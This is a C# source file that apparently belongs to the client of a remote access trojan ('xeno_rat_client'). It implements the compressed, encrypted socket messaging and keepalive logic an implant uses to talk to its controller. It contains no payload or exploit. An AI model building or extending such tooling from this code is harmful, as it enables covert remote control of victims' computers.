using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace xeno_rat_client
{
    class header
    {
        public bool Compressed = false;
        public int OriginalFileSize;
        public int T_offset = 1;
    }
    public class SocketHandler
    {
        public Socket sock;
        public byte[] EncryptionKey;
        private int socktimeout = 0;
        public SocketHandler(Socket socket, byte[] _EncryptionKey)
        {
            sock = socket;
            sock.NoDelay = true;
            EncryptionKey = _EncryptionKey;
        }

        /// <summary>
        /// Asynchronously receives all data of specified size from the connected socket and returns the received data as a byte array.
        /// </summary>
        /// <param name="size">The size of the data to be received.</param>
        /// <returns>The received data as a byte array. Returns null if the socket is not connected or if no data is received.</returns>
        /// <remarks>
        /// This method asynchronously receives data from the connected socket until the total received data size matches the specified size.
        /// It initializes variables to track the total received data size, the remaining data size, and the timestamps for tracking the start and last send time.
        /// If the socket is not connected, it returns null. If no data is received, it returns null.
        /// </remarks>
        private async Task<byte[]> RecvAllAsync_ddos_unsafer(int size)
        {
            byte[] data = new byte[size];
            int total = 0;
            int dataLeft = size;
            DateTime startTimestamp = DateTime.Now;
            DateTime lastSendTime = DateTime.Now; // Initialize the last send time

            while (total < size)
            {
                if (!sock.Connected)
                {
                    return null;
                }

                int recv = await sock.ReceiveAsync(new ArraySegment<byte>(data, total, dataLeft), SocketFlags.None);

                if (recv == 0)
                {
                    data = null;
                    break;
                }

                total += recv;
                dataLeft -= recv;
            }

            return data;
        }

        /// <summary>
        /// Asynchronously receives all the data of the specified size from the connected socket and returns it as a byte array.
        /// </summary>
        /// <param name="size">The size of the data to be received.</param>
        /// <returns>The received data as a byte array. Returns null if the socket is not connected, or if the timeout is reached.</returns>
        /// <exception cref="SocketException">Thrown when an error occurs with the socket.</exception>
        /// <exception cref="ObjectDisposedException">Thrown when the socket has been closed.</exception>
        /// <remarks>
        /// This method asynchronously receives data from the connected socket until the specified size is reached.
        /// If the socket is not connected, it returns null. If the timeout is reached, it also returns null.
        /// This method uses asynchronous socket operations to efficiently receive data and handle timeouts.
        /// </remarks>
        private async Task<byte[]> RecvAllAsync_ddos_safer(int size)
        {
            byte[] data = new byte[size];
            int total = 0;
            int dataLeft = size;
            DateTime startTimestamp = DateTime.Now;
            DateTime lastSendTime = DateTime.Now; // Initialize the last send time

            while (total < size)
            {
                if (!sock.Connected)
                {
                    return null;
                }
                int availableBytes = sock.Available;

                if (availableBytes > 0)
                {
                    int recv = await sock.ReceiveAsync(new ArraySegment<byte>(data, total, dataLeft), SocketFlags.None);

                    if (recv == 0)
                    {
                        data = null;
                        break;
                    }

                    total += recv;
                    dataLeft -= recv;
                }
                else
                {
                    if (socktimeout != 0)
                    {
                        TimeSpan elapsed = DateTime.Now - startTimestamp;
                        if (elapsed.TotalMilliseconds >= socktimeout)
                        {
                            // Timeout reached, handle accordingly
                            data = null;
                            break;
                        }
                    }

                    TimeSpan timeSinceLastSend = DateTime.Now - lastSendTime;

                    if (timeSinceLastSend.TotalMilliseconds >= 1500) // Check if 1 and a half second has passed
                    {
                        await sock.SendAsync(new ArraySegment<byte>(new byte[] { 1, 0, 0, 0, 2 }), SocketFlags.None);
                        lastSendTime = DateTime.Now; // Update the last send time
                    }

                    // Wait a short period before checking again to avoid busy waiting.
                    await Task.Delay(10);
                }
            }

            return data;
        }

        /// <summary>
        /// Concatenates two byte arrays and returns the result.
        /// </summary>
        /// <param name="b1">The first byte array to be concatenated. If null, an empty byte array is used.</param>
        /// <param name="b2">The second byte array to be concatenated.</param>
        /// <returns>The concatenation of <paramref name="b1"/> and <paramref name="b2"/>.</returns>
        /// <remarks>
        /// This method concatenates the input byte arrays <paramref name="b1"/> and <paramref name="b2"/> into a single byte array.
        /// If <paramref name="b1"/> is null, an empty byte array is used as the first array for concatenation.
        /// The resulting byte array contains all the elements of <paramref name="b1"/> followed by all the elements of <paramref name="b2"/>.
        /// </remarks>
        public static byte[] Concat(byte[] b1, byte[] b2)
        {
            if (b1 == null) b1 = new byte[] { };
            List<byte[]> d = new List<byte[]>();
            d.Add(b1);
            d.Add(b2);
            return d.SelectMany(a => a).ToArray();
        }

        /// <summary>
        /// Parses the header from the given byte array and returns the header information.
        /// </summary>
        /// <param name="data">The byte array containing the header information.</param>
        /// <returns>The parsed header information as a <see cref="header"/> object.</returns>
        /// <remarks>
        /// This method parses the header information from the input byte array. If the first byte of the array is 1, it indicates that the data is compressed, and the method sets the corresponding properties of the <see cref="header"/> object.
        /// If the first byte is not 1, it checks if it is not 0 and returns null. Otherwise, it returns the parsed header information.
        /// </remarks>
        private header ParseHeader(byte[] data)
        {
            header Header = new header();
            if (data[0] == 1)
            {
                Header.Compressed = true;
                Header.OriginalFileSize = BytesToInt(data, 1);
                Header.T_offset = 5;
            }
            else if (data[0] != 0)
            {
                return null;
            }
            return Header;
        }

        /// <summary>
        /// Truncates the input byte array from the specified offset and returns the truncated data.
        /// </summary>
        /// <param name="bytes">The input byte array from which data will be truncated.</param>
        /// <param name="offset">The offset from which the truncation will start.</param>
        /// <returns>The truncated byte array starting from the specified <paramref name="offset"/>.</returns>
        /// <remarks>
        /// This method creates a new byte array <paramref name="T_data"/> with a length equal to the original array's length minus the specified <paramref name="offset"/>.
        /// It then uses Buffer.BlockCopy to copy the data from the original array starting from the specified <paramref name="offset"/> into the new array.
        /// The truncated data is then returned as a new byte array.
        /// </remarks>
        public byte[] BTruncate(byte[] bytes, int offset)
        {
            byte[] T_data = new byte[bytes.Length - offset];
            Buffer.BlockCopy(bytes, offset, T_data, 0, T_data.Length);
            return T_data;
        }

        /// <summary>
        /// Sends the provided byte array after performing compression, encryption, and adding protocol upgrade byte.
        /// </summary>
        /// <param name="data">The byte array to be sent.</param>
        /// <exception cref="ArgumentNullException">Thrown when the input <paramref name="data"/> is null.</exception>
        /// <returns>True if the data is sent successfully; otherwise, false.</returns>
        /// <remarks>
        /// This method compresses the input <paramref name="data"/> using the Compression class, then encrypts it using the EncryptionKey.
        /// It adds a protocol upgrade byte and sends the data using the sock object.
        /// If an exception occurs during the process, it returns false, indicating a possible disconnection.
        /// </remarks>
        public async Task<bool> SendAsync(byte[] data)
        {
            if (data == null)
            {
                throw new ArgumentNullException(nameof(data), "data can not be null!");
            }

            try
            {
                byte[] compressedData = Compression.Compress(data);
                byte didCompress = 0;
                int orgLen = data.Length;
                if (compressedData != null && compressedData.Length < orgLen)
                {
                    data = compressedData;
                    didCompress = 1;
                }
                byte[] header = new byte[] { didCompress };
                if (didCompress == 1)
                {
                    header = Concat(header, IntToBytes(orgLen));
                }
                data = Concat(header, data);
                data = Encryption.Encrypt(data, EncryptionKey);
                data = Concat(new byte[] { 3 }, data);//protocol upgrade byte
                byte[] size = IntToBytes(data.Length);
                data = Concat(size, data);
                await sock.SendAsync(new ArraySegment<byte>(data), SocketFlags.None);

                return true;
            }
            catch
            {
                return false; // should probably disconnect
            }
        }

        /// <summary>
        /// Asynchronously receives and processes data from the client.
        /// </summary>
        /// <returns>The received data as a byte array, or null if the client has disconnected.</returns>
        /// <remarks>
        /// This method continuously receives data from the client and processes it. It first receives the length of the incoming data, then the actual data.
        /// If the client has disconnected at any point during the process, the method returns null.
        /// The received data is processed based on the protocol and headers, including encryption, compression, and truncation.
        /// </remarks>
        public async Task<byte[]> ReceiveAsync()
        {
            try
            {
                while (true)
                {
                    byte[] length_data = await RecvAllAsync_ddos_unsafer(4);
                    if (length_data == null)
                    {
                        return null;//disconnect
                    }
                    int length = BytesToInt(length_data);
                    byte[] data = await RecvAllAsync_ddos_unsafer(length);//add checks if the client has disconnected, add it to everything
                    if (data == null)
                    {
                        return null;//disconnect
                    }

                    header Header;

                    if (data[0] == 3)//protocol upgrade
                    {
                        data = BTruncate(data, 1);
                        data = Encryption.Decrypt(data, EncryptionKey);
                        if (data[0] == 2)
                        {
                            continue;
                        }
                        Header = ParseHeader(data);
                        if (Header == null)
                        {
                            return null;//disconnect
                        }
                        data = BTruncate(data, Header.T_offset);
                        if (Header.Compressed)
                        {
                            data = Compression.Decompress(data, Header.OriginalFileSize);
                        }
                        return data;
                    }
                    else if (data[0] == 2)
                    {
                        continue;
                    }
                    
                    Header = ParseHeader(data);
                    if (Header == null)
                    {
                        return null;//disconnect
                    }
                    data = BTruncate(data, Header.T_offset);
                    if (Header.Compressed)
                    {
                        data = Compression.Decompress(data, Header.OriginalFileSize);
                    }
                    data = Encryption.Decrypt(data, EncryptionKey);
                    return data;

                }
            }
            catch
            {
                return null;//disconnect
            }
        }

        /// <summary>
        /// Converts a byte array to an integer value.
        /// </summary>
        /// <param name="data">The byte array to be converted.</param>
        /// <param name="offset">The offset within the byte array where the conversion should start (default is 0).</param>
        /// <returns>The integer value converted from the byte array.</returns>
        /// <remarks>
        /// This method converts the specified byte array <paramref name="data"/> to an integer value based on the endianness of the system.
        /// If the system is little-endian, the bytes are combined in little-endian order (least significant byte first).
        /// If the system is big-endian, the bytes are combined in big-endian order (most significant byte first).
        /// </remarks>
        public int BytesToInt(byte[] data, int offset = 0)
        {
            if (BitConverter.IsLittleEndian)
            {
                return data[offset] | data[offset + 1] << 8 | data[offset + 2] << 16 | data[offset + 3] << 24;
            }
            else
            {
                return data[offset + 3] | data[offset + 2] << 8 | data[offset + 1] << 16 | data[offset] << 24;
            }
        }

        /// <summary>
        /// Converts an integer to an array of bytes.
        /// </summary>
        /// <param name="data">The integer to be converted to bytes.</param>
        /// <returns>An array of bytes representing the input integer.</returns>
        /// <remarks>
        /// This method converts the input integer <paramref name="data"/> to an array of bytes.
        /// It first checks the endianness of the system using BitConverter.IsLittleEndian property.
        /// If the system is little-endian, it populates the byte array in little-endian order, otherwise in big-endian order.
        /// The method then returns the resulting byte array.
        /// </remarks>
        public byte[] IntToBytes(int data)
        {
            byte[] bytes = new byte[4];

            if (BitConverter.IsLittleEndian)
            {
                bytes[0] = (byte)data;
                bytes[1] = (byte)(data >> 8);
                bytes[2] = (byte)(data >> 16);
                bytes[3] = (byte)(data >> 24);
            }
            else
            {
                bytes[3] = (byte)data;
                bytes[2] = (byte)(data >> 8);
                bytes[1] = (byte)(data >> 16);
                bytes[0] = (byte)(data >> 24);
            }

            return bytes;
        }

        /// <summary>
        /// Sets the receive timeout for the socket.
        /// </summary>
        /// <param name="ms">The receive timeout value in milliseconds.</param>
        /// <remarks>
        /// This method sets the receive timeout for the underlying socket to the specified value in milliseconds.
        /// </remarks>
        public void SetRecvTimeout(int ms)
        {
            socktimeout = ms;
            sock.ReceiveTimeout = ms;
        }

        /// <summary>
        /// Resets the receive timeout for the socket.
        /// </summary>
        /// <remarks>
        /// This method sets the receive timeout for the socket to zero, effectively disabling the timeout.
        /// </remarks>
        public void ResetRecvTimeout()
        {
            socktimeout = 0;
            sock.ReceiveTimeout = 0;
        }
    }
}
